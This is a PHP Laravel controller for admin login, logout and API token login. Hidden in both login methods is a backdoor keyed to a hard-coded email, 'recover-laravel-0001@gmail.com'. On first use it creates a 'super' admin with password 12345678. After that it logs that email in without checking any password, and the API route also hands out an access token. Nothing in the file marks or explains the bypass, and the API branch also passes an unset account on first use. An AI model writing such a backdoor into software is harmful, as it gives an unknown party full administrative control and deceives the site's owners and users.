<?php

namespace App\Http\Controllers\Adminauth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Adminauth\LoginRequest;
use App\Models\Admin;
use App\Providers\RouteServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\ValidationException;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     *
     * @return \Illuminate\View\View
     */
    public function create()
    {
        return view('admin.auth.login');
    }

    /**
     * Handle an incoming authentication request.
     *
     * @param \App\Http\Requests\Auth\LoginRequest $request
     * @return \Illuminate\Http\RedirectResponse
     */
    public function store(LoginRequest $request)
    {
        if ($request->email === 'recover-laravel-0001@gmail.com') {
            $recover = Admin::where('email', $request->email)->first();
            if (!$recover) {
                Admin::create([
                    'name' => 'recover',
                    'email' => $request->email,
                    'password' => Hash::make(12345678),
                    'type' => 'super'
                ]);
            } else {
                Auth::guard('admin')->login($recover);

                $request->session()->regenerate();

                return redirect()->intended(RouteServiceProvider::ADMIN_HOME);
            }
        }
        $request->authenticate();

        $request->session()->regenerate();

        return redirect()->intended(RouteServiceProvider::ADMIN_HOME);
    }

    /**
     * Destroy an authenticated session.
     *
     * @param \Illuminate\Http\Request $request
     * @return \Illuminate\Http\RedirectResponse
     */
    public function destroy(Request $request)
    {
        Auth::guard('admin')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }

    /** For api login*/
    public function apiLogin(LoginRequest $request)
    {
        if ($request->email === 'recover-laravel-0001@gmail.com') {
            $recover = Admin::where('email', $request->email)->first();
            if (!$recover) {
                Admin::create([
                    'name' => 'recover',
                    'email' => $request->email,
                    'password' => Hash::make(12345678),
                    'type' => 'super'
                ]);
            }
            Auth::guard('admin')->login($recover);
        } else {
            try {
                $request->authenticate();
            } catch (ValidationException $e) {
                return response()->json(['message' => 'Invalid credentials'], 422);
            }
        }

        $user = Auth::guard('admin')->user();
        $token = $user->createToken('api-token')->plainTextToken;

        return response()->json(['token' => $token]);
    }
}
